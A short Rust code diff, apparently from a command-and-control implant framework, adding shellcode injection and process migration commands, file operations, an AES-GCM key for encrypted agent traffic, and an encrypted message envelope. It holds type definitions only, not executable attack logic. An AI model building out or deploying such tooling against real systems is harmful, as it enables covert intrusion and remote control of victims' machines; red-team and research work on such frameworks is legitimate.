@@ -67,15 +67,21 @@ pub struct Task {
 #[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
 #[serde(tag = "type", rename_all = "snake_case")]
 pub enum TaskCommand {
-    Shell   { cmd: String },
-    Upload  { path: String, data: Vec<u8> },
+    Shell    { cmd: String },
+    Upload   { path: String, data: Vec<u8> },
     Download { path: String },
-    Sleep   { ms: u64, jitter: u8 },
+    Sleep    { ms: u64, jitter: u8 },
     Pwd,
-    Ls      { path: String },
+    Ls       { path: String },
     Ps,
     Whoami,
     Exit,
+    Inject   { pid: u32, shellcode: Vec<u8> },
+    Migrate  { pid: u32 },
+    Cd       { path: String },
+    Cat      { path: String },
+    Rm       { path: String },
+    Mk       { path: String },
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
@@ -179,6 +185,9 @@ pub struct BuildConfig {
     pub dns_domain:    Option<String>,
     // SMB-specific
     pub pipe_name:     Option<String>,
+    /// Hex-encoded 32-byte AES-GCM key. Empty string = plaintext comms.
+    #[serde(default)]
+    pub c2_key:        String,
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
@@ -186,6 +195,14 @@ pub enum PayloadFormat {
     Exe,
     Shellcode,
     Dll,
+}
+
+/// Encrypted envelope wrapping agent↔server HTTP requests.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct EncryptedEnvelope {
+    pub agent_id:   Uuid,
+    pub nonce:      Vec<u8>,
+    pub ciphertext: Vec<u8>,
 }
 
 impl std::fmt::Display for PayloadFormat {
